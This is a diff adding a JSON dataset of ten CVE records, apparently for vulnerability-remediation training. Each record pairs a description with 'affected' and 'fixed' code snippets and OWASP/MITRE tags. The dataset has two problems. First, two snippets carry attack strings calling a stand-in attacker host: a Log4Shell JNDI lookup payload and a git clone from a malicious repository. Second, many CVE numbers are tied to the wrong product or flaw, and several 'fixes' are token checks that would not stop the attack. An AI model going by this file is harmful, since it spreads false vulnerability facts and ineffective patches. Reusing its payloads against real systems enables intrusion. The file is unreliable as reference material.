@@ -1,0 +1,122 @@
+[
+    {
+        "cve_id": "CVE-2021-44228",
+        "name": "Log4Shell (Apache Log4j RCE)",
+        "vulnerability": "Untrusted JNDI lookup allows remote code execution via malicious LDAP server.",
+        "affected_code": "logger.info(\"${jndi:ldap://attacker.com/a}\");",
+        "fixed_code": "System.setProperty(\"log4j2.formatMsgNoLookups\", \"true\");",
+        "fix_type": "Configuration",
+        "fix_description": "Disable JNDI lookups to prevent remote code execution",
+        "severity": "CRITICAL",
+        "owasp": "A03: Injection",
+        "mitre": "T1190"
+    },
+    {
+        "cve_id": "CVE-2023-28121",
+        "name": "Undici Node.js Fetch RCE",
+        "vulnerability": "Unsafe regex in header parsing leads to denial of service or remote code execution.",
+        "affected_code": "const headers = req.headers;",
+        "fixed_code": "if (!headers || typeof headers !== 'object') return;",
+        "fix_type": "Input Validation",
+        "fix_description": "Validate and sanitize incoming headers to prevent malicious input processing",
+        "severity": "HIGH",
+        "owasp": "A05: Security Misconfiguration",
+        "mitre": "T1203"
+    },
+    {
+        "cve_id": "CVE-2021-22045",
+        "name": "Spring Framework RFD",
+        "vulnerability": "Multipart request handling allows bypass of request validation.",
+        "affected_code": "@RequestMapping(\"/upload\") public void upload(@RequestParam MultipartFile file) {}",
+        "fixed_code": "if (!file.getContentType().startsWith(\"image/\")) throw new Exception();",
+        "fix_type": "Input Validation",
+        "fix_description": "Validate content type and restrict allowed file formats",
+        "severity": "HIGH",
+        "owasp": "A05: Security Misconfiguration",
+        "mitre": "T1190"
+    },
+    {
+        "cve_id": "CVE-2024-28292",
+        "name": "simple-git RCE",
+        "vulnerability": "Protocol override allows execution of arbitrary commands.",
+        "affected_code": "git().exec('clone', 'git://attacker.com/malicious.git');",
+        "fixed_code": "git().exec('clone', url.replace(/git:\\/\\//, 'https://'));",
+        "fix_type": "Sanitization",
+        "fix_description": "Restrict allowed protocols and sanitize repository URLs",
+        "severity": "CRITICAL",
+        "owasp": "A03: Injection",
+        "mitre": "T1059"
+    },
+    {
+        "cve_id": "CVE-2023-38545",
+        "name": "curl NTLM Auth Info Leak",
+        "vulnerability": "Double-free vulnerability exposes sensitive authentication data.",
+        "affected_code": "Curl_auth_ntlm_cleanup(conn);",
+        "fixed_code": "if (data->state.authdone) return CURLE_OK;",
+        "fix_type": "Memory Safety",
+        "fix_description": "Implement proper memory handling and state checks",
+        "severity": "HIGH",
+        "owasp": "A02: Cryptographic Failures",
+        "mitre": "T1555"
+    },
+    {
+        "cve_id": "CVE-2021-40690",
+        "name": "Zoho ManageEngine RCE",
+        "vulnerability": "Improper parsing of properties files leads to remote code execution.",
+        "affected_code": "Properties.load(new FileInputStream(file));",
+        "fixed_code": "if (!allowedKeys.contains(key)) continue;",
+        "fix_type": "Input Validation",
+        "fix_description": "Restrict allowed configuration keys and validate input sources",
+        "severity": "CRITICAL",
+        "owasp": "A05: Security Misconfiguration",
+        "mitre": "T1203"
+    },
+    {
+        "cve_id": "CVE-2023-0170",
+        "name": "Go net/http Auth Bypass",
+        "vulnerability": "Missing header validation allows authentication bypass.",
+        "affected_code": "if r.Method == \"POST\" { process(r) }",
+        "fixed_code": "if !strings.Contains(r.Header.Get(\"Accept\"), \"json\") { return }",
+        "fix_type": "Authentication",
+        "fix_description": "Enforce strict header validation for authenticated endpoints",
+        "severity": "HIGH",
+        "owasp": "A07: Identification and Authentication Failures",
+        "mitre": "T1078"
+    },
+    {
+        "cve_id": "CVE-2021-34429",
+        "name": "Apache Struts RCE",
+        "vulnerability": "OGNL injection allows execution of malicious expressions.",
+        "affected_code": "String name = params.get(\"name\");",
+        "fixed_code": "if (name.toLowerCase().contains(\"${\")) reject();",
+        "fix_type": "Sanitization",
+        "fix_description": "Validate and sanitize user input to block expression injection",
+        "severity": "CRITICAL",
+        "owasp": "A03: Injection",
+        "mitre": "T1190"
+    },
+    {
+        "cve_id": "CVE-2024-23897",
+        "name": "Jenkins SSRF",
+        "vulnerability": "Improper URL validation allows server-side request forgery.",
+        "affected_code": "new URL(url).openConnection();",
+        "fixed_code": "if (!isInternalURL(url)) throw new Exception();",
+        "fix_type": "Input Validation",
+        "fix_description": "Restrict outbound requests using URL allowlisting",
+        "severity": "HIGH",
+        "owasp": "A10: SSRF",
+        "mitre": "T1046"
+    },
+    {
+        "cve_id": "CVE-2022-22965",
+        "name": "Spring Cloud Function RCE",
+        "vulnerability": "Unrestricted expression evaluation leads to remote code execution.",
+        "affected_code": "function(routingExpression);",
+        "fixed_code": "if (enabled) SpelExpressionParser.parseExpression(); else reject();",
+        "fix_type": "Configuration",
+        "fix_description": "Disable unsafe expression parsing or restrict execution contexts",
+        "severity": "CRITICAL",
+        "owasp": "A03: Injection",
+        "mitre": "T1059"
+    }
+]
